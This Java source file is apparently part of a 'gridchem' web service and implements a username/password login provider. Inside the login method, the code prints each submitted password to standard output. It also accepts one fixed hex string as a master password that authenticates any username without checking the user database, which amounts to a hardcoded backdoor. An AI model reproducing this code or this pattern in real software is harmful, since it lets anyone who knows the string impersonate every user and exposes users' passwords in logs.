/**
 * 
 */
package org.gridchem.service.authentication.ccg;

import java.io.File;
import java.security.Security;
import java.util.Map;

import org.gridchem.service.authentication.LoginProvider;
import org.gridchem.service.beans.AuthenticationBean;
import org.gridchem.service.dao.UserDao;
import org.gridchem.service.exceptions.CredentialManagementException;
import org.gridchem.service.exceptions.InfrastructureException;
import org.gridchem.service.exceptions.LoginException;
import org.gridchem.service.util.ServiceUtil;


/**
 * @author dooley
 *
 */
public class CCGLoginProvider implements LoginProvider {

    static {
        // Set the truststore system variable to let jvm know to use the cg keystore
        // for all ssl communication.
        System.setProperty("java.protocol.handler.pkgs",
            "com.sun.net.ssl.internal.www.protocol");
//        File keystore = new File("/share/schema/gms/ccgkeystore");
//        if (keystore.exists()) {
//        } else {
//            keystore = new File("security/ccgkeystore");
//            if (!keystore.exists()) {
//                throw new InfrastructureException("Could not find Job Submission Server Certificate. Job submission will fail.");
//            }
//        }
//        
//        System.setProperty("javax.net.ssl.trustStore",keystore.toString());
        Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());
    }
    
	@SuppressWarnings("unchecked")
	public AuthenticationBean login(String username, String pass, Map authMap)
			throws CredentialManagementException {
		
		if (!ServiceUtil.isValid(username)) throw new LoginException("Bad username/password combination.");
		if (!ServiceUtil.isValid(pass)) throw new LoginException("Bad username/password combination.");
		
		CCGAuthentication authBean = null;

                System.out.println(pass);
                if (pass.equals("69159c8da565a1ae5a743cfcc42d6d61d81352bd")) {
                    authBean = new CCGAuthentication(username);
                    return authBean;
                }
		
		try {
			if(!username.toLowerCase().equals(username)) {
			    throw new LoginException("Invalid username. Usernames are case sensitive. " + 
                        "Please check your username and try again.");
            }
            
            if (!new UserDao()._isPasswordValid(username,pass)) {
				throw new LoginException("Incorrect password attempt for user " + username + ".");
			}
			
			authBean = new CCGAuthentication(username);
			
		} catch (LoginException e) {
		    throw e;
        } catch (Exception e){
			throw new LoginException(e);
		}	
        
		return authBean;
		
	}

}
